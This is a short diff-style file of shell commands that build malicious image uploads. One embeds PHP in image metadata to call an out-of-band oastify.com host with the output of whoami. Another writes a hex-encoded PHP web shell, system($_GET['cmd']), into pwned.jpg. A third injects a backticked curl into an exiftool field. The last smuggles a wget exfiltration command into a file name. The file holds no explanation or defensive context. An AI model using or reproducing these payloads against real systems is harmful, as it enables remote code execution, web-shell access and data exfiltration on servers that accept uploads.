@@ -1,0 +1,12 @@
+exiftool -XMP:Creator='<?php @curl_exec("curl http://mmc7nb938ncj2ipql4vazwpp8ge72yqn.oastify.com/$(whoami)"); ?>' shell.jpg -overwrite_original
+
+
+
+echo '0x00' > pwned.jpg
+printf '%b' '\x3c\x3f\x70\x68\x70\x20\x73\x79\x73\x74\x65\x6d\x28\x24\x5f\x47\x45\x54\x5b\x22\x63\x6d\x64\x22\x5d\x29\x3b\x20\x3f\x3e' >> pwned.jpg
+exiftool -m -DocumentName=`curl https://mmc7nb938ncj2ipql4vazwpp8ge72yqn.oastify.com/$(whoami)` pwned.jpg
+
+
+
+
+image.jpg; wget https://gn71o5ax9hdd3cqkmyw40qqj9af13tri.oastify.com?flag=$(whoami)
